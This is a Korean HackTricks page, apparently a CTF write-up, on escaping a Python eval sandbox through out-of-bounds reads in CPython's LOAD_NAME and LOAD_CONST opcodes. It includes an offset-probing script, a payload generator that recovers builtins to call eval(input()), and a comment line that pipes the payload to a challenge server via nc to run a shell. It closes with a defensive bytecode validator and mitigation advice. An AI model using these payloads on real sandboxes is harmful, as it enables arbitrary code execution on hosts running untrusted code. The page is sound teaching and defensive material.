# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

이 페이지는 Splitline의 HITCON CTF 2022 "V O I D" 원본 writeup과 exploit chain을 기반으로 작성되었습니다.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

`LOAD_NAME` 또는 `LOAD_CONST` operand는 의도적으로 짧게 만든 `co_names` 또는 `co_consts` tuple의 외부를 읽을 수 있습니다. 이 challenge에서는 근처 항목에 `__getattribute__`와 같은 유용한 attribute가 포함될 때까지 도달할 수 없는 dummy name이 사용됩니다.<sup>[[1]](#references)</sup>

이후 payload는 복구한 name을 재사용하여 sandbox escape를 구성합니다.<sup>[[1]](#references)</sup>

### 개요 <a href="#overview-1" id="overview-1"></a>

challenge wrapper는 짧으며, 평가하기 전에 하나의 expression을 compile합니다.<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
입력은 Python code object로 컴파일된 다음, wrapper가 `eval`을 호출하기 전에 해당 객체의 `co_consts`와 `co_names`를 빈 tuple로 바꿉니다.<sup>[[1]](#references)[[5]](#references)</sup>

생성된 instruction이 여전히 이 테이블 중 하나를 인덱싱하면, build에 따라 interpreter가 crash하거나 인접한 object pointer가 노출될 수 있습니다.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault는 어떻게 발생할까요?

`[a, b, c]`와 같은 list expression의 경우, compiler는 연속된 operand를 사용하는 `LOAD_NAME` instruction을 생성합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
`co_names`가 `()`로 대체되면 bytecode에는 여전히 `LOAD_NAME 2`가 남습니다. 따라서 검사되지 않은 tuple access가 `IndexError`를 발생시키는 대신 tuple 외부의 pointer를 가져올 수 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME`과 `LOAD_CONST`는 여기서 핵심 primitive입니다. 각각의 integer operand가 각각 `co_names`와 `co_consts`의 항목을 선택합니다.<sup>[[1]](#references)[[2]](#references)</sup>

CPython의 dispatch에서 `LOAD_CONST`는 선택된 tuple 항목을 가져와 push합니다. release build에서는 검사되지 않은 tuple accessor를 사용합니다:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
대상 interpreter에서 `LOAD_NAME` operand를 점점 증가시키며 유용한 항목을 매핑합니다. Splitline은 challenge 환경에서 700을 초과하는 유용한 offset을 확인했지만, 레이아웃은 build에 따라 다릅니다. debugger를 사용하면 주변 memory를 검사하는 데 도움이 됩니다.<sup>[[1]](#references)</sup>

### Exploit 생성 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

offset에서 유용한 name을 얻으면, 도달할 수 없는 expression에 범위를 벗어난 lookup을 배치하고 도달 가능한 attribute access에서 동일한 `co_names` slot을 참조합니다.<sup>[[1]](#references)</sup>

예를 들어 offset 5에서 `__getattribute__`가 반환되면, false branch에서 유용한 lookup을 수행하는 동안 해당 name을 slot 5에 유지합니다.<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> 복구된 텍스트는 반드시 `__getattribute__`일 필요가 없습니다. payload 역할을 하는 모든 식별자가 해당 슬롯에 들어갈 수 있습니다.<sup>[[1]](#references)</sup>

디스어셈블리 결과에서 볼 수 있듯이, compiler는 동일한 이름이 반복해서 나타날 때 `co_names` 슬롯을 재사용합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
`LOAD_ATTR`도 `co_names`를 통해 이름을 확인하므로, 도달 가능한 분기에서 해당 슬롯을 재사용할 수 있습니다. 최신 CPython 버전의 패킹된 피연산자에 대해서는 아래 버전 참고 사항에 설명되어 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

상수 없이도 boolean 표현식으로 작은 음이 아닌 정수를 만들 수 있습니다.<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

원래 exploit은 challenge의 길이 제한을 지키기 위해 상수 대신 이름을 사용했습니다.<sup>[[1]](#references)</sup>

이 helper는 빈 `co_names` tuple로 code object를 생성하여 후보 이름 오프셋을 탐색합니다.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
아래 generator는 복구된 offset을 이름에 매핑하고 source-level payload를 생성합니다.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
높은 수준에서, 생성된 payload는 함수의 globals를 가져오고, `builtins`를 복구한 다음 `eval(input())`을 호출합니다.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### 버전 참고 사항 및 영향을 받는 opcode (Python 3.11–3.13)

- CPython 3.11–3.13에서 instructions는 여전히 정수 operand를 사용해 code object의 constant 및 name table을 인덱싱합니다. 어느 tuple이든 참조된 index보다 짧으면, 검증되지 않은 access가 인접한 object pointer를 읽어 crash를 일으키거나 해당 pointer를 대상으로 동작할 수 있습니다. 정확한 동작은 interpreter build에 따라 달라집니다.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` 및 (3.12+) `RETURN_CONST consti`는 `co_consts[consti]`를 읽습니다.<sup>[[2]](#references)</sup>
- name table을 직접 사용하는 opcode에는 `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, 그리고 (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`가 있습니다.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` 및 `LOAD_ATTR namei`는 `co_names[namei >> 1]`을 사용합니다. low bit는 문서화된 NULL/method 동작을 제어합니다. (3.12+) `LOAD_SUPER_ATTR namei`는 `co_names[namei >> 2]`를 사용하며 low bits에 두 개의 flag를 패킹합니다.<sup>[[2]](#references)</sup>
- Python 3.11+에서는 instruction 사이에 숨겨진 `CACHE` entry를 추가하는 adaptive/inline cache가 도입되었습니다. 직접 작성한 bytecode는 `co_code`를 구성할 때 해당 entry를 고려해야 합니다.<sup>[[2]](#references)</sup>

실질적인 의미: bytecode layout과 복구된 offset은 release 및 build에 따라 달라집니다. 이 technique과 생성된 payload를 사용하기 전에 대상 CPython version에서 테스트해야 합니다.<sup>[[2]](#references)</sup>

### 유용한 OOB index를 찾기 위한 간단한 scanner (3.11+/3.12+ 호환)

high-level source가 아니라 bytecode에서 직접 흥미로운 object를 탐색하려면, 최소한의 code object를 생성하고 index를 brute-force할 수 있습니다. 아래 helper는 대상 interpreter의 `dis` metadata에 따라 inline cache를 삽입합니다.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
참고
- 대신 names를 probe하려면 `LOAD_CONST`를 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`로 교체하고, 대상 opcode에 맞게 stack 사용과 packed operand를 조정합니다.<sup>[[2]](#references)</sup>
- 필요한 경우 `EXTENDED_ARG` 또는 `arg`의 여러 바이트를 사용해 255보다 큰 인덱스에 도달할 수 있습니다. 이 helper는 낮은 operand 바이트만 생성하므로, 더 큰 인덱스에는 raw byte 구성 또는 여러 번의 load가 필요합니다.<sup>[[2]](#references)</sup>

### 최소 bytecode-only RCE 패턴 (co_consts OOB → builtins → eval/input)

builtins module로 확인되는 `co_consts` 인덱스를 식별하면 stack을 조작해 `co_names` 없이 `eval(input())`을 재구성할 수 있습니다. 공식 B01lers CTF 2024 `awpcode` 자료에는 이와 동일한 OOB-read 패턴이 설명되어 있습니다.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
이 stack-only 접근 방식은 challenge에서 `co_code`를 직접 제어하도록 하면서 `co_consts=()` 및 `co_names=()`을 강제하는 경우에 유용합니다. source-level tricks를 피하고 bytecode stack operations 및 tuple builders를 사용해 payload를 작게 유지할 수 있습니다.<sup>[[4]](#references)</sup>

### Sandboxes를 위한 방어 검사 및 완화 방법

신뢰할 수 없는 code를 compile하거나 evaluate하는 Python sandbox를 작성하는 경우, bytecode에서 사용되는 tuple indexes의 bounds-check를 CPython에 의존하지 마세요. 실행하기 전에 code objects를 검증하세요.<sup>[[2]](#references)[[3]](#references)</sup>

실용적인 validator (`co_consts`/`co_names`에 대한 OOB access를 거부).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
추가 완화 아이디어
- 신뢰할 수 없는 입력에 대해 임의의 `CodeType.replace(...)`를 허용하지 않거나, 결과 코드 객체에 대해 엄격한 구조 검사를 추가합니다.
- CPython semantics에 의존하는 대신, OS-level sandboxing(seccomp, job objects, containers)을 적용한 별도 프로세스에서 신뢰할 수 없는 코드를 실행하는 것을 고려합니다.

## References

- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (이 technique의 기원과 high-level exploit chain)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands, and inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
